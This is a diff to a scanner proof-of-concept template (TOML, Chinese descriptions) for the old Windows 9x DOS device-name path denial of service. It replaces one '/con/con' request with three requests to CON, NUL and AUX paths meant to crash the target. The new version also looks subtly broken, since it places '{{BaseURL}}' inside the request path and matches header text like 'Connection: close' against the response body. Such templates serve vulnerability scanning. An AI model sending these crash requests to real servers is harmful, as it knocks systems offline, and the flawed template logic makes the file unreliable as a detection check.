@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过向目标 Web 服务器发送包含保留 DOS 设备名（CON、NUL、AUX、PRN、COM1、LPT1 等）的路径请求，触发 Windows 9x/NT/2000 系统蓝屏崩溃，造成拒绝服务。验证方式：发送 GET /con/con 请求后检测服务器连接断开。"
+description = "通过向 Windows 9x 系统上的 Web 服务发送包含 DOS 设备名（如 CON、NUL、AUX）的特制 HTTP 请求路径，触发系统对设备名路径的异常处理，导致蓝屏崩溃或系统挂起，造成拒绝服务。"
 id = "POC-AVE-2000-0148"
-name = "Microsoft Windows DOS Device in Path Name DoS PoC"
+name = "Microsoft Windows 9x DOS Device Name Path DoS PoC"
 severity = "medium"
 tags = ["ave-2000-0148"]
 vuln_id = [
@@ -11,11 +11,11 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/con/con"
+path = "/{{BaseURL}}/CON/CON"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -23,7 +23,34 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "Connection reset",
-    "connection refused",
-    "reset by peer",
+    "Connection: close",
+    "Service Unavailable",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/NUL/NUL"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection: close",
+    "Service Unavailable",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/AUX/AUX"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection: close",
+    "Service Unavailable",
 ]
